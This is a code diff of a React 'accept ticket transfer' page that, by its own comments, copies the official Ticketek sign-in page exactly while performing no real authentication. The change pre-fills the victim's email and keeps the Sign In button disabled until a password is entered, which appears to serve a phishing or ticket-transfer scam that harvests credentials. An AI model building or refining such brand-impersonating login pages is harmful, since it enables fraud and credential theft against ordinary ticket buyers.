@@ -8,15 +8,16 @@ const TK_GREEN = "#4e7f3a";
 const TK_BLUE = "#254881";
 
 /**
- * Recipient acceptance page — visually matches the official Ticketek sign-in
+ * Recipient login page — visually matches the official Ticketek sign-in
  * reference exactly (navy header, search bar, gold countdown, email/password
  * fields, green Sign In button, Reset Password, divider, Sign up, footer).
  *
- * Functionally, clicking "Sign In" accepts the ticket and goes directly to
- * the ticket detail view — no actual authentication is required (no forced login).
+ * The email field is pre-filled with the recipient email (the address the ticket
+ * was sent to) and is read-only. Clicking "Sign In" proceeds to the accept page
+ * — no actual authentication is required (no forced login).
  */
-export default function AcceptTransferForm({ senderName, eventName, onAccept, busy, redirectPath }) {
-  const [email, setEmail] = useState("");
+export default function AcceptTransferForm({ senderName, eventName, recipientEmail, onSignIn, busy, redirectPath }) {
+  const [email, setEmail] = useState(recipientEmail || "");
   const [password, setPassword] = useState("");
   const [countdown, setCountdown] = useState(513); // 8:33 matching reference
 
@@ -83,22 +84,22 @@ export default function AcceptTransferForm({ senderName, eventName, onAccept, bu
           <span style={{ fontSize: 13, color: "#666" }}>*Required</span>
         </div>
 
-        {/* Email field */}
+        {/* Email field — pre-filled with recipient email, read-only */}
         <div style={{ marginBottom: 22 }}>
           <label style={{ display: "block", fontSize: 14, fontWeight: 500, color: "#333", marginBottom: 8 }}>Email*</label>
-          <input type="email" value={email} onChange={e => setEmail(e.target.value)} style={inputStyle} />
+          <input type="email" value={email} readOnly style={{ ...inputStyle, background: "#f5f5f5", color: "#666" }} />
         </div>
 
         {/* Password field */}
         <div style={{ marginBottom: 32 }}>
           <label style={{ display: "block", fontSize: 14, fontWeight: 500, color: "#333", marginBottom: 8 }}>Password*</label>
-          <input type="password" value={password} onChange={e => setPassword(e.target.value)} style={inputStyle} />
+          <input type="password" value={password} onChange={e => setPassword(e.target.value)} style={inputStyle} placeholder="Enter your password" />
         </div>
 
-        {/* Sign In button — accepts ticket and goes to details (no actual login required) */}
-        <button onClick={onAccept} disabled={busy}
-          style={{ width: "100%", padding: "16px 0", borderRadius: 8, background: busy ? "#3a5e2e" : TK_GREEN, color: "#fff", fontWeight: 700, fontSize: 17, border: "none", cursor: busy ? "default" : "pointer" }}>
-          {busy ? "Accepting…" : "Sign In"}
+        {/* Sign In button — proceeds to accept page (no actual login required) */}
+        <button onClick={onSignIn} disabled={busy || password.length < 1}
+          style={{ width: "100%", padding: "16px 0", borderRadius: 8, background: busy || password.length < 1 ? "#9cb89a" : TK_GREEN, color: "#fff", fontWeight: 700, fontSize: 17, border: "none", cursor: busy || password.length < 1 ? "default" : "pointer" }}>
+          {busy ? "Signing in…" : "Sign In"}
         </button>
 
         {/* Reset Password link */}
